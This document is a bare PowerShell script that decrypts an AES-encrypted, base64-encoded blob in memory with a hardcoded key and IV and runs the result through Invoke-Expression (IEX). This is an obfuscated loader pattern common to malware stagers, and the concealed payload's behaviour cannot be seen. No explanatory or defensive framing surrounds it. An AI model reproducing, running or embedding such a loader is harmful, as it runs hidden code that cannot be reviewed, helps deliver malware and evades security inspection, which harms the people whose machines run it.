$key = [System.Text.Encoding]::UTF8.GetBytes("PhantomKey1234567890123456789012")
$iv = [System.Text.Encoding]::UTF8.GetBytes("1234567890123456")
$enc = "rZWLNLcpuMnGExephNEDAeqtl3Ef/Xx3oYUihu5cMvV/vDt/3A1b6rauTffGeL7u1FKhD6ZROae8bC4y/+aQy/mnSNC/wpSsG3xQteo2yYLNSo+pyyz0DnS0lPhrAq91iny0xNU22ocynHEaVrIPqwYiTriDjJiOU++mhZOXou34MTdO/vEOAB+gXMyyPsfJ/5FuTFhKLsTa1uolP6Sx7gTh0lSrSQGDVg927Y1G/KGJemXi5ua1BqiqpGQyvAFuHpSpGoLC55wv2NrcdPHGsykDMafqq5A2YeGPES/Gpvi0t6k8uwdsCWfe10x8/OjGkIhwp/ATDP72a4tud1Ew9JiMJus6Hl3FOARU0irdBwyc7Ys7bpQaOLGdc/5xmjWAWfrzchrlkFMbvLc4WCtMP1Q1TKg1ndRl8A04Xr63JIt2QLHEHLrZrdCSutLJljzoDK+Pj/CKy4TOOmg7gnGjAHm3ihm2ix9Gp2/QJ76oj1hcB/YIQjy0GN6rKMQwYI/da9w5i55Fnz9YjUeryNZbHszwSdVAA/K0C9DOSr+VfU7r64EXiluIQmMJs1RSwaqUlDTNoMfmVza0qi5QYfe6u8/Ps6nMX7Sa4FaMykQsaf8KjUd+XuLSlEUCfx2eT5bxZxSnzynV2lvEsumdLmz9zwv/i4wMXbUEctQq7cCJ1AB/7/5yWtCeNkSu5qzpfX9wmaiVgX7SErnGIUZg33Owv/Hr/lpAuLeqh0LQTlV0oLdkUt0gfKTaFnSfc7eUgcTaLVXIG/7HX0kSCrOk7iXBXWV/P56ulxgcgd6fLJPgowxH+XpwXM81cZdJo9NADyMF7rkw5rrp3pogFjJCUd9ntAEkCnZ2kkdApYd9yfVmBF1VEqgzBFVTJhsLJaVrGZ6MNn+Jczwap/YIbR71zUVC0/J40OK4FSie2PmYwUapckx0GPvhI45ebjzvBuRASaynpSTVkDmhqokE7cKzNO0ViKgcmTQ6sEhTdDDCxKVKt9cGBCphRq7Iq871CT3TsBQv"
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key; $aes.IV = $iv
$ms = New-Object System.IO.MemoryStream(,[Convert]::FromBase64String($enc))
$cs = New-Object System.Security.Cryptography.CryptoStream($ms, $aes.CreateDecryptor(), [System.Security.Cryptography.CryptoStreamMode]::Read)
$sr = New-Object System.IO.StreamReader($cs)
$decryptedScript = $sr.ReadToEnd()
$sr.Close();$cs.Close();$ms.Close()
IEX $decryptedScript
